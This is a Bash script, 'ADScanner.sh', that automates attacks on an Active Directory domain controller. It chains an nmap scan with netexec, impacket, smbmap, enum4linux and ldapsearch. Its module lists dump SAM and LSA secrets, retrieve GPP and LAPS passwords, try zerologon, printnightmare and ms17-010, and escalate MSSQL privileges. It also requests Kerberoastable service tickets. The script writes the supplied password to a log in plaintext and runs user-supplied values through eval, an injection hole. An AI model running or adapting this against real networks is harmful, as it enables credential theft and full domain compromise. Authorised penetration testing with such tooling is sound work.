#!/usr/bin/env bash

# ========================================================================================
# ADScanner.sh - Active Directory Enumeration Script
# GNU Bash 5.2.37(1)-release compatible
# ========================================================================================

# ------------------------------------
# Global Variables and Defaults
# ------------------------------------
export SCRIPT_DIR="$(dirname "$0")"
export OUTPUT_DIR="$SCRIPT_DIR/tool_outputs"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$SCRIPT_DIR/ADScanner.log"
DATE_TIME="$(date +%Y%m%d_%H%M)"
REPORT_FILE="$SCRIPT_DIR/${DATE_TIME}_report.txt"

export IP=""
export USERNAME=""
export PASSWORD=""
export DOMAIN=""
export KDCHOST=""
export ADFQDN=""
export QUIET_MODE=false
export trueRoot=false
export OPEN_PORTS=""

# Load configuration if available
CONFIG_FILE="$SCRIPT_DIR/config.sh"
[[ -f "$CONFIG_FILE" ]] && source "$CONFIG_FILE"

# Default ports (can be overridden by config.sh)
SMB_PORTS="137,138,139,445"
LDAP_PORTS="389,636"
MSSQL_PORT="1433"
WINRM_PORTS="5985,5986"
KERBEROS_PORT="88"
SSH_PORT="22"
MYSQL_PORT="3306"
HTTP_PORT="80"
HTTPS_PORT="443"
NFS_PORT="2049"
FTP_PORT="21"

# ------------------------------------
# Logging Functions
# ------------------------------------
log() {
    local type="$1"
    local msg="$2"
    local timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
    echo "[$timestamp] [$type] $msg" | tee -a "$LOG_FILE" >> "$REPORT_FILE"
}

append_to_report() {
    local section="$1"
    local message="$2"
    echo -e "\n---------- $section ----------" >> "$REPORT_FILE"
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$REPORT_FILE"
}

# ------------------------------------
# Root Privilege Check
# ------------------------------------
check_root() {
    if [[ $(id -u) -ne 0 ]]; then
        log "ERROR" "Script must run as root. Use sudo."
        exit 1
    else
        export trueRoot=true
        [[ "$QUIET_MODE" = false ]] && echo "[+] SCRIPT IS RUNNING AS ROOT"
        log "INFO" "Script is running as root."
    fi
}

# ------------------------------------
# Argument Parsing
# ------------------------------------
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i)
                IP="$2"; shift 2;;
            -u)
                USERNAME="$2"; shift 2;;
            -p)
                PASSWORD="$2"; shift 2;;
            -d)
                DOMAIN="$2"; shift 2;;
            -k)
                KDCHOST="$2"; shift 2;;
            -f)
                ADFQDN="$2"; shift 2;;
            --quiet)
                QUIET_MODE=true; shift;;
            -h|--help|help)
                print_help;;
            *)
                log "ERROR" "Unknown argument: $1"
                print_help
                exit 1;;
        esac
    done

    # Validate IPv4 format
    if ! [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        log "ERROR" "Invalid IPv4 format. Use xxx.xxx.xxx.xxx"
        exit 1
    fi

    export IP USERNAME PASSWORD DOMAIN KDCHOST ADFQDN
    log "INFO" "Inputs: IP=$IP USERNAME=$USERNAME PASSWORD=$PASSWORD DOMAIN=$DOMAIN KDCHOST=$KDCHOST ADFQDN=$ADFQDN"
}

print_help() {
    cat << EOF
Usage: $0 [options]

Active Directory Enumeration Script

Options:
  -i <IP>           Target IP address of the Domain Controller (required)
  -u <USERNAME>     Username for authentication (optional)
  -p <PASSWORD>     Password for authentication (optional)
  -d <DOMAIN>       Domain name e.g., example.local (optional)
  -k <KDCHOST>      KDC hostname for Kerberos authentication (required for kerberos)
  -f <ADFQDN>       AD FQDN required for Kerberos ticketing (required for kerberos)
  --quiet           Suppress most terminal output (optional)
  -h, --help        Show this help message and exit

Example:
  sudo ./ADScanner.sh -i 192.168.1.10 -u admin -p Passw0rd -d example.local -k dc.example.local -f example.local

EOF
    exit 0
}

# ------------------------------------
# Connectivity Check
# ------------------------------------
test_connectivity() {
    local host="$1"
    if ping -c 1 -W 2 "$host" > /dev/null 2>&1; then
        [[ "$QUIET_MODE" = false ]] && echo "[+] Host $host is reachable"
        append_to_report "Connectivity Check" "Host $host is reachable"
    else
        [[ "$QUIET_MODE" = false ]] && echo "[-] Host $host is not reachable"
        append_to_report "Connectivity Check" "Host $host is not reachable"
        log "ERROR" "Ping to $host failed"
        exit 1
    fi
}

# ------------------------------------
# Port Scanning
# ------------------------------------
scan_ports() {
    local portsTCP="$SMB_PORTS,$LDAP_PORTS,$MSSQL_PORT,$WINRM_PORTS,$KERBEROS_PORT,$SSH_PORT,$MYSQL_PORT,$HTTP_PORT,$HTTPS_PORT,$NFS_PORT,$FTP_PORT"
    log "INFO" "Scanning TCP ports: $portsTCP"
    nmap -sS -n -p "$portsTCP" "$IP" -oG "$OUTPUT_DIR/nmap.output" --open > "$OUTPUT_DIR/nmap_grepable_summary.output"
    local result=$(cat "$OUTPUT_DIR/nmap_grepable_summary.output")
    append_to_report "Port Scan" "$result"

    export OPEN_PORTS=$(grep -Po '\d+/open/tcp' "$OUTPUT_DIR/nmap.output" | cut -d '/' -f1 | paste -sd ',' -)
    log "INFO" "Open ports: $OPEN_PORTS"
    [[ -z "$OPEN_PORTS" ]] && log "WARNING" "No open ports detected. Nmap parsing may have failed."
}

# ------------------------------------
# Clock Synchronization
# ------------------------------------
sync_clock() {
    local ntp_tool="ntpdate"
    local ntp_port=123
    local max_attempts=3
    local attempt=1
    local output=""

    if ! command -v "$ntp_tool" >/dev/null 2>&1; then
        output="Error: $ntp_tool is not installed. Install it with 'sudo apt install ntp'."
        echo "[-] $output"
        append_to_report "Clock Synchronization" "$output"
        return 1
    fi

    if ! command -v nc >/dev/null 2>&1; then
        output="Error: netcat (nc) is not installed. Install it with 'sudo apt install netcat'."
        echo "[-] $output"
        append_to_report "Clock Synchronization" "$output"
        return 1
    fi

    if ! nc -z -u -w 2 "$IP" "$ntp_port" >/dev/null 2>&1; then
        output="Error: NTP port $ntp_port/UDP is not open on $IP. Time synchronization skipped."
        echo "[-] $output"
        append_to_report "Clock Synchronization" "$output"
        return 1
    fi

    local sudo_cmd=""
    if [ "$(id -u)" -ne 0 ]; then
        sudo_cmd="sudo"
        if ! command -v sudo >/dev/null 2>&1 || ! $sudo_cmd -n true 2>/dev/null; then
            output="Error: sudo is required for $ntp_tool but not available or not configured."
            echo "[-] $output"
            append_to_report "Clock Synchronization" "$output"
            return 1
        fi
    fi

    echo "[+] Synchronizing clock with $IP using $ntp_tool..."
    while [ $attempt -le $max_attempts ]; do
        output=$($sudo_cmd $ntp_tool "$IP" 2>&1)
        if [ $? -eq 0 ]; then
            output="Successfully synchronized clock with $IP.\n$output"
            echo "[+] $output"
            append_to_report "Clock Synchronization" "$output"
            return 0
        fi
        echo "[-] Attempt $attempt/$max_attempts failed: $output"
        sleep 2
        ((attempt++))
    done

    output="Error: Failed to synchronize clock with $IP after $max_attempts attempts.\nLast error: $output"
    echo "[-] $output"
    append_to_report "Clock Synchronization" "$output"
    return 1
}

# ------------------------------------
# Active Directory Enumeration
# ------------------------------------

execute_netexec_smb_kerberos() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi

    if [[ -z "$ADFQDN" || -z "$KDCHOST" ]]; then
        log "ERROR" "Skipping Kerberos netexec SMB test: ADFQDN or KDCHOST not provided"
        return
    fi

    if [[ "$OPEN_PORTS" == *"88"* ]]; then
        MODULES=(
            "--shares"
            "--users"
            "--groups"
            "--pass-pol"
            "--local-group"
            "--rid-brute"
            "--delegate Administrator"
            "-M gpp_password"
            "-M coerce_plus"
            "-M enum_av"
            "-M enum_ca"
            "-M gpp_autologin"
            "-M spooler"
            "-M webdav"
            "-M veeam"
            "-M printnightmare"
            "-M ms17-010"
            "-M gpp_autologin"
            "--sam"
            "--lsa"
            "--user $USERNAME"
        )

        for mod in "${MODULES[@]}"; do
            CMD="netexec smb -k '$ADFQDN'"
            [[ -n "$USERNAME" && -n "$PASSWORD" && -n "$DOMAIN" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN' --kdcHost '$KDCHOST'"
            CMD+=" $mod"
            log "INFO" "Executing netexec with Kerberos: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_smb_kerberos.output"
            append_to_report "netexec SMB $mod" "$OUT"
        done
    else
        log "INFO" "Port 88 not open, skipping Kerberos netexec SMB execution."
    fi
}

execute_netexec_smb_ntlm() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=(
            "--shares"
            "--users"
            "--groups"
            "--pass-pol"
            "--local-group"
            "--rid-brute"
            "--delegate Administrator"
            "-M gpp_password"
            "-M coerce_plus"
            "-M enum_av"
            "-M enum_ca"
            "-M gpp_autologin"
            "-M spooler"
            "-M webdav"
            "-M veeam"
            "-M zerologon"
            "-M printnightmare"
            "-M ms17-010"
            "-M gpp_autologin"
            "--sam"
            "--lsa"
            "--user $USERNAME"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec smb '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN'"
            CMD+=" $mod"
            log "INFO" "Executing netexec with NTLM: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_smb_ntlm.output"
            append_to_report "netexec SMB $mod" "$OUT"
        done
    fi
}

execute_netexec_ldap() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"636"* ]]; then
        MODULES=(
            "-M adcs"
            "-M enum_trusts"
            "-M get-desc-users"
            "-M get-network"
            "-M get-unixUserPassword"
            "-M get-userPassword"
            "-M groupmembership -o USER=$USERNAME"
            "-M laps"
            "-M ldap-checker"
            "-M pso"
            "-M subnets"
            "-M user-desc"
            "-M whoami"
            "-M daclread -o TARGET=Administrator ACTION=read"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ldap '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ldap.output"
            append_to_report "netexec ldap $mod" "$OUT"
        done
    fi
}

execute_netexec_winrm() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"5985"* || "$OPEN_PORTS" == *"5986"* ]]; then
        MODULES=(" ")
        for mod in "${MODULES[@]}"; do
            CMD="netexec winrm '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_winrm.output"
            append_to_report "netexec winrm $mod" "$OUT"
        done
    fi
}

execute_netexec_mssql() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"1433"* ]]; then
        MODULES=(
            " "
            "--local-auth"
            "--local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'"
            "--local-auth -x whoami"
            "--rid-brute"
            "-M mssql_priv -o ACTION=privesc"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec mssql '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_mssql.output"
            append_to_report "netexec mssql $mod" "$OUT"
        done
    fi
}

execute_netexec_ssh() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"22"* ]]; then
        MODULES=(
            " "
            "--local-auth"
            "-x whoami"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ssh '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ssh.output"
            append_to_report "netexec ssh $mod" "$OUT"
        done
    fi
}

execute_netexec_ftp() {
    if ! command -v netexec >/dev/null 2>&1; then
        log "ERROR" "netexec is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"21"* ]]; then
        MODULES=(
            " "
            "--local-auth"
            "--ls"
        )
        for mod in "${MODULES[@]}"; do
            CMD="netexec ftp '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/netexec_ftp.output"
            append_to_report "netexec ftp $mod" "$OUT"
        done
    fi
}

execute_enum4linux() {
    if ! command -v enum4linux >/dev/null 2>&1; then
        log "ERROR" "enum4linux is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=("-a")
        for mod in "${MODULES[@]}"; do
            CMD="enum4linux '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/enum4linux.output"
            append_to_report "enum4linux $mod" "$OUT"
        done
    fi
}

execute_enum4linux-ng() {
    if ! command -v enum4linux-ng >/dev/null 2>&1; then
        log "ERROR" "enum4linux-ng is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=(" ")
        for mod in "${MODULES[@]}"; do
            CMD="enum4linux-ng '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/enum4linux-ng.output"
            append_to_report "enum4linux-ng $mod" "$OUT"
        done
    fi
}

execute_smbmap() {
    if ! command -v smbmap >/dev/null 2>&1; then
        log "ERROR" "smbmap is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* ]]; then
        MODULES=(
            "-u null"
            "-R"
            "-A '(xml|xlsx|docx|txt|xml|ini|backup)'"
        )
        for mod in "${MODULES[@]}"; do
            CMD="smbmap -H '$IP'"
            [[ -n "$USERNAME" && -n "$PASSWORD" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN'"
            CMD+=" $mod"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/smbmap.output"
            append_to_report "smbmap $mod" "$OUT"
        done
    fi
}

execute_impacket_getuserspns() {
    if ! command -v impacket-GetUserSPNs >/dev/null 2>&1; then
        log "ERROR" "impacket-GetUserSPNs is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"445"* || "$OPEN_PORTS" == *"88"* ]]; then
        CMD="impacket-GetUserSPNs '$DOMAIN/$USERNAME:$PASSWORD' -dc-ip '$IP' -request"
        log "INFO" "Executing: $CMD"
        OUT=$(eval "$CMD" 2>&1)
        echo "$OUT" >> "$OUTPUT_DIR/impacket_getuserspns.output"
        append_to_report "impacket-GetUserSPNs" "$OUT"
    fi
}

execute_impacket_getTGT() {
    if ! command -v impacket-getTGT >/dev/null 2>&1; then
        log "ERROR" "impacket-getTGT is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"88"* ]]; then
        CMD="impacket-getTGT '$DOMAIN/$USERNAME:$PASSWORD' -dc-ip '$IP'"
        log "INFO" "Executing: $CMD"
        OUT=$(eval "$CMD" 2>&1)
        echo "$OUT" >> "$OUTPUT_DIR/impacket-getTGT.output"
        append_to_report "impacket-getTGT" "$OUT"
    fi
}

execute_ldapsearch() {
    if ! command -v ldapsearch >/dev/null 2>&1; then
        log "ERROR" "ldapsearch is not installed"
        return
    fi
    if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"636"* ]]; then
        SEARCHES=(
            "'(objectClass=user)' sAMAccountName cn userPrincipalName memberOf"
            "'(objectClass=group)' sAMAccountName cn member"
            "'(objectClass=computer)' sAMAccountName cn dNSHostName operatingSystem"
            "'(servicePrincipalName=*)' sAMAccountName servicePrincipalName"
            "'(objectClass=organizationalUnit)' name description"
            "'(adminCount=1)' sAMAccountName cn memberOf"
            "-x -s base namingcontexts"
            "-x -b 'DC=${DOMAIN//./,DC=}'"
        )
        for search in "${SEARCHES[@]}"; do
            CMD="ldapsearch -x -H ldap://$IP -D '$USERNAME@$DOMAIN' -w '$PASSWORD' -b 'DC=${DOMAIN//./,DC=}'"
            [[ -n "$search" ]] && CMD+=" $search"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1)
            echo "$OUT" >> "$OUTPUT_DIR/ldapsearch.output"
            append_to_report "ldapsearch $search" "$OUT"
        done
    fi
}

# ------------------------------------
# Main Execution
# ------------------------------------
main() {
    parse_args "$@"
    check_root
    test_connectivity "$IP"
    scan_ports
    sync_clock
    # Enum AD shares
    execute_smbmap
    # Enum all AD
    execute_enum4linux
    execute_enum4linux-ng
    # Targeted enum of AD
    execute_netexec_smb_ntlm
    execute_netexec_smb_kerberos
    execute_netexec_winrm
    execute_netexec_ldap
    execute_netexec_mssql
    execute_netexec_ssh
    execute_netexec_ftp
    execute_ldapsearch
    execute_impacket_getuserspns
    execute_impacket_getTGT
}

main "$@"
